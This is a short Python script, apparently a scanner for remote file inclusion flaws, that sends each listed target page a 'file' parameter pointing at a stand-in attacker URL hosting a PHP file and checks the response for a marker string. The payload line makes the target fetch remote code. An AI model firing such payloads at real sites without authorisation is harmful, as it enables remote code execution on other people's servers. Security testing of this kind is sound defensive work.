import requests
from colorama import init, Fore

init(autoreset=True)


def scan_remote_file_inclusion(url, file_param, file_path):
    payload = {
        file_param: file_path
    }

    try:
        response = requests.get(url, params=payload)

        if response.status_code == 200 and "VULNERABLE_CONTENT" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False



if __name__ == '__main__':
    target_urls = [
        "http://example.com/page1.php",
        "http://example.com/page2.php",
        # 添加更多目标URL
    ]

    file_param = "file"
    file_path = "http://malicious-site.com/malicious-file.php"

    for url in target_urls:
        scan_remote_file_inclusion(url, file_param, file_path)
